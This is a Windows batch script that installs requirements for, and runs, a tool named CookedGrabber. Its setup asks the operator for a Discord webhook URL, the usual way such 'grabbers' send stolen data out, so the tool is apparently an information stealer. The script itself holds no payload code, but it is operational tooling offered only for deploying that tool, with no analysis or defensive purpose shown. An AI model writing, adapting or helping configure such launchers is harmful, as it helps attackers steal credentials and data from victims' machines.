@echo off
title CookedGrabber - Setup and Run
echo ===================================================
echo             CookedGrabber Local Setup
echo ===================================================

:: Check if Python is installed
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Python is not installed or not in PATH!
    echo Please install Python 3.9+ from https://www.python.org/downloads/
    pause
    goto :eof
)

:: Install requirements
echo [INFO] Installing requirements...
pip install -r requirements.txt >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Failed to install requirements.
    pause
    goto :eof
)

:: Ask for Webhook URL if not set
if "%WEBHOOK_URL%"=="" (
    set /p WEBHOOK_URL="Enter your Discord Webhook URL: "
)

:: Run script
echo [INFO] Running CookedGrabber...
python CookedGrabber.py
pause
